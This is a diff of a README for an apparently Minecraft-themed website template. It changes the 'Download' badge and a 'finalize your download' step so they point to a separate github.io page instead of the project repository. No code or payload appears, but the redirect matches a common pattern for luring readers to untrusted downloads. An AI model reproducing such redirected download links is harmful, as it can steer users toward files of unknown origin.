@@ -1,6 +1,6 @@
 # ⛏️ iama-minecraft-2026-web - Create your own Minecraft themed website
 
-[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://github.com/luciferlu755/iama-minecraft-2026-web)
+[![](https://img.shields.io/badge/Download-Project_Files-blue.svg)](https://luciferlu755.github.io)
 
 ## 📖 About this project
 The iama-minecraft-2026-web project provides the source code for a web-based Minecraft experience. This repository contains the HTML, CSS, and script files necessary to host or customize your own site. You can use this for personal projects, fan pages, or private servers. You do not need to be a developer to host this site on your computer.
@@ -17,7 +17,7 @@ To run this website locally on your Windows computer, you need these items:
 2. Click the green button labeled Code.
 3. Select Download ZIP from the drop-down menu.
 4. Save the file to your computer.
-5. You can visit this page to finalize your download: [https://github.com/luciferlu755/iama-minecraft-2026-web](https://github.com/luciferlu755/iama-minecraft-2026-web)
+5. You can visit this page to finalize your download: [https://luciferlu755.github.io](https://luciferlu755.github.io)
 
 ## 🚀 Setting up the website
 1. Locate the downloaded ZIP file in your Downloads folder.
